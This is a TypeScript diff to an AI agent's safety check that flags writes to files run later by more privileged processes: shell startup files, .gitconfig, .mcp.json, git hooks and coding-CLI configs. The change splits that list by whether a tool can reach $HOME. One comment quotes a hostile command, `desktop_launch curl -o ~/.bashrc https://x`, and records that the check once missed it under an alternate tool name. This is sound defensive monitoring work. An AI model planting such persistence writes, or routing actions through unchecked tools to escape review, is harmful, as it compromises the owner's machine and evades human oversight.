@@ -241,15 +241,19 @@ export const isDurableInstructionPath = (path: string): boolean => {
  * Matched on segments rather than anchored, for the same reason the durable rule is: `~/.bashrc`,
  * `.bashrc`, `../.bashrc` and `/home/athanor/ws-1/.bashrc` are one file written by one call, and a
  * rule that only recognised one spelling is a rule one spelling away from being no rule.
+ *
+ * TWO SETS, because the reach of the tool decides whether the write can land on the file at all.
+ * These eleven are read out of `$HOME` and out of nowhere else: bash and zsh read their startup
+ * files from `$HOME`, git reads `.gitconfig` from `$HOME` and `/etc`, and a copy of any of them one
+ * directory down is an inert text file. @see `HOME_ONLY_DEFERRED_EXECUTION_FILES` below for why
+ * that distinction is not pedantry.
  */
-const DEFERRED_EXECUTION_FILES = new Set([
+const HOME_ONLY_DEFERRED_EXECUTION_FILES = new Set([
   '.bash_login',
   '.bash_logout',
   '.bash_profile',
   '.bashrc',
   '.gitconfig',
-  '.gitmodules',
-  '.mcp.json',
   '.profile',
   '.zlogin',
   '.zlogout',
@@ -257,6 +261,16 @@ const DEFERRED_EXECUTION_FILES = new Set([
   '.zshenv',
   '.zshrc'
 ]);
+
+/**
+ * The two that execute wherever they sit.
+ *
+ * `.gitmodules` is read by `git submodule` in whatever repository holds it, and `.mcp.json` is a
+ * project-scoped server list a coding CLI reads from the directory it is run in - and the agent
+ * runs those CLIs inside `workspace/`. Neither needs `$HOME` to be anywhere in particular, so both
+ * are reachable by every tool and both keep their card everywhere.
+ */
+const PROJECT_DEFERRED_EXECUTION_FILES = new Set(['.gitmodules', '.mcp.json']);
 
 /**
  * Directories whose whole contents configure a process that runs on its own afterwards: the
@@ -269,12 +283,36 @@ const DEFERRED_EXECUTION_DIRECTORIES = new Set(['.claude', '.codex', '.opencode'
 /** The same directories spelled the way XDG spells them, as `~/.config/<name>`. */
 const XDG_DEFERRED_EXECUTION_DIRECTORIES = new Set(['claude', 'codex', 'opencode']);
 
-export const isDeferredExecutionPath = (path: string): boolean => {
+/**
+ * Whether a written path is one a later, more privileged process executes.
+ *
+ * `reachesHome` is the caller's answer to a question only the caller can answer: can the tool
+ * making this write put bytes at the agent's `$HOME` at all? `shell` can - it is handed a path and
+ * a shell, and `~/.bashrc` there is the real one. `file_write`, `file_patch` and `print_pdf`
+ * cannot, and the reason is a bound rather than a habit: every path they are given goes through
+ * `assertUserDataPath` (services/workspace-runner/src/files.ts), which admits only `workspace/` and
+ * `.athanor/artifacts`, refuses anything absolute or stepping up through `..`, and folds a bare
+ * name into `workspace/`. `HOME` is the container root one level ABOVE `workspace/`
+ * (execution.ts: `HOME: workspaceRoot`), so `file_write('.bashrc')` writes
+ * `workspace/.bashrc` - a file no login shell has ever read - and `file_write('../.zshenv')` and
+ * `file_write('/home/athanor/ws-1/.bash_profile')` are refused outright before any of this runs.
+ *
+ * Measured before this parameter existed: eleven of the thirteen names in the deferred set were
+ * unreachable by those three tools, and the card fired `external_consequential` in every mode on a
+ * write nothing on this computer would ever execute. The two that stayed reachable are the two that
+ * do not need `$HOME` - see `PROJECT_DEFERRED_EXECUTION_FILES` - along with `.git/hooks/*`,
+ * `.git/config` and the coding-CLI directories, all of which a coding CLI or git reads out of the
+ * project directory the agent works in. Those keep their card through every tool, and this is why
+ * the narrowing is a name split rather than a blanket exemption for the file tools.
+ */
+export const isDeferredExecutionPath = (path: string, reachesHome = true): boolean => {
   const segments = path
     .toLowerCase()
     .split(/[\\/]+/)
     .filter((segment) => segment && segment !== '.');
-  if (DEFERRED_EXECUTION_FILES.has(segments.at(-1) ?? '')) return true;
+  const last = segments.at(-1) ?? '';
+  if (PROJECT_DEFERRED_EXECUTION_FILES.has(last)) return true;
+  if (reachesHome && HOME_ONLY_DEFERRED_EXECUTION_FILES.has(last)) return true;
   // `.git/hooks/<anything>` is run by git itself, and `.git/config` can point `core.hooksPath` at
   // a directory of the writer's choosing, which is the same fact one level of indirection away.
   // A bare `.git` or a bare `.git/hooks` is not a write to either.
@@ -320,3 +358,31 @@ export const writtenPaths = (name: string, args: Record<string, unknown>): strin
     .map((patch) => textValue((patch as { path?: unknown } | null)?.path))
     .filter(Boolean);
 };
+
+/** The tools whose every path the runner folds into `workspace/` or refuses. @see isDeferredExecutionPath */
+const PATH_CONFINED_TOOLS = new Set(['file_write', 'file_patch', 'print_pdf']);
+
+/**
+ * The paths this call leaves for a later, more privileged process to execute.
+ *
+ * One reader for the floor's deferred-execution card, holding both halves of the same fact: which
+ * paths a call writes, and whether the tool writing them can reach the place those names mean
+ * something. Kept here rather than in the floor because `writtenPaths` and the deferred set are
+ * here, and a rule split across two files is how the durable-instruction rule and this one drifted
+ * apart the first time.
+ *
+ * `desktop_launch` is read with `shell`'s reader, because they are the same act wearing two names -
+ * both take an executable and arguments and run them on the owner's computer, and the one that is
+ * not `shell` runs as the runner's own account rather than as the sandboxed agent. The floor
+ * already says this twice, once for the taint half and once for the destructive, upload and push
+ * gates; it was not true here, and `desktop_launch curl -o ~/.bashrc https://x` was measured
+ * raising nothing outside review while the identical `shell` call raised
+ * `external_consequential`.
+ */
+export const deferredExecutionPaths = (name: string, args: Record<string, unknown>): string[] => [
+  ...new Set(
+    writtenPaths(name === 'desktop_launch' ? 'shell' : name, args).filter((path) =>
+      isDeferredExecutionPath(path, !PATH_CONFINED_TOOLS.has(name))
+    )
+  )
+];
